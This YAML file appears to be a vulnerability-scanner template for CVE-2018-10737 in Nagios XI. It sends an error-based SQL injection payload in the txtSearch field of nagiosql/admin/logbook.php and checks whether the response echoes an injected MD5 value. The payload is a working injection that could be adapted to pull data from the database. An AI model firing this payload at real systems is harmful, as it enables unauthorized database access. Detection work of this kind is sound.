id: poc-local-xray-nagio-cve-2018-10737

info:
  name: poc-local-xray-nagio-cve-2018-10737
  author: capiton
  severity: high
  description: ""
  reference:
    - https://www.seebug.org/vuldb/ssvid-97267
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10737
  metadata:
    fofa-query: ""
    Vulnerability-Impact: "Nagios XI 5.2.x以及小于5.4.13的5.4.x"
  tags: nagios

variables:
  r1: "{{rand_int(2000000000, 2100000000)}}"
  md5_r1: "{{md5(r1)}}"


requests:
  - method: POST
    path:
      - "{{RootURL}}/nagiosql/admin/logbook.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "txtSearch=' and (select 1 from(select count(*),concat((select (select (select md5({{r1}}))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{md5_r1}}"
        condition: and

